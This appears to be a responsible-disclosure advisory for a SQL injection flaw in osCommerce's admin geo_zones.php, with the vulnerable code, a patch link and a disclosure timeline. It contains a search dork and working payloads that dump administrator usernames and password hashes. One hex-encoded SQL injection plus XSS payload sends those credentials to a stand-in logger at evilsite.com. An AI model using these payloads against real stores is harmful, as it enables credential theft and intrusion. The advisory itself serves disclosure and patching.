@@ -1,0 +1,61 @@
+# Title: osCommerce v2.x SQL Injection Vulnerability
+# Dork: Powered by osCommerce
+# Author: Ahmed Aboul-Ela
+# Contact: ahmed.aboul3la[at]gmail[dot]com - http://twitter.com/_secgeek
+# Vendor : http://www.oscommerce.com
+# Version: v2.3.3.4 (current latest release) and prior versions should be affected too 
+# References: http://www.secgeek.net/oscommerce-v2x-sql-injection-vulnerability
+
+- Vulnerable Code snippet in "catalog/admin/geo_zones.php":
+
+ <?php
+ [...]
+ LINE 138: $rows = 0;
+ LINE 139: $zones_query_raw = "select a.association_id, a.zone_country_id, c.countries_name, a.zone_id, a.geo_zone_id, a.last_modified, 
+ a.date_added, z.zone_name from " . TABLE_ZONES_TO_GEO_ZONES . " a left join " . TABLE_COUNTRIES . " c on a.zone_country_id = c.countries_id 
+ left join " . TABLE_ZONES . " z on a.zone_id = z.zone_id where a.geo_zone_id = " . $HTTP_GET_VARS['zID'] . " order by association_id";
+ LINE 140: $zones_split = new splitPageResults($HTTP_GET_VARS['spage'], MAX_DISPLAY_SEARCH_RESULTS, $zones_query_raw, $zones_query_numrows);
+ LINE 141: $zones_query = tep_db_query($zones_query_raw);
+ [...]
+ ?>    
+ 
+   As we can see at line 139 the GET zID parameter directly concatenated with the sql query 
+   without any type of sanitization which leads directly to sql injection vulnerability
+
+
+- Proof of Concept ( dump the admin username and password ): 
+
+   http://site.com/oscommerce/catalog/admin/geo_zones.php?action=list&zID=1 group by 1 union select 1,2,3,4,5,6,7,concat(user_name,0x3a,user_password) from administrators --
+
+
+- Exploitation & Attack Scenario:
+
+   an  authenticated admin account is required to successfully exploit the vulnerability
+   but it can be combined with other attack vectors like XSS / CSRF to achieve more dangerous successful remote attack  
+
+   Example to steal the administrator username & password and send it to php logger at "http://evilsite.com/logger.php?log=[ADMIN USER:HASH]"
+
+   We can use hybrid attack technique ( SQL Injection + XSS ) :
+
+    http://site.com/oscommerce/catalog/admin/geo_zones.php?action=list&zID= 1 group by 1 union select 1,2,3,4,5,6,7,concat(0x3c6469762069643d2274657374223e,user_name,0x3d,user_password,0x3c2f6469763e3c7363726970743e646f63756d656e742e6c6f636174696f6e2e687265663d22687474703a2f2f6576696c736974652e636f6d2f6c6f676765722e7068703f6c6f673d222b242822237465737422292e68746d6c28293c2f7363726970743e) from administrators --
+
+
+- Mitigation:
+  
+   The vendor has released a quick fix for the vulnerability. It is strongly recommended to apply the patch now
+
+    https://github.com/gburton/oscommerce2/commit/e4d90eccd7d9072ebe78da4c38fb048bfe31c902 
+
+
+- Time-Line:
+
+    Mon, Feb 3, 2014 at 10:17 PM: vulnerability advisory sent to osCommerce
+    Tue, Feb 4, 2014 at 01:14 AM: recevied initial reply from osCommerce 
+    Tue, Feb 4, 2014 at 02:06 AM: osCommerce released a quick fix for the vulnerability
+    Thu, Feb 6, 2014 at 05:15 PM: the public responsible disclosure
+
+
+- Credits:
+
+    Ahmed Aboul-Ela - Information Security Consultant @ Starware 
+
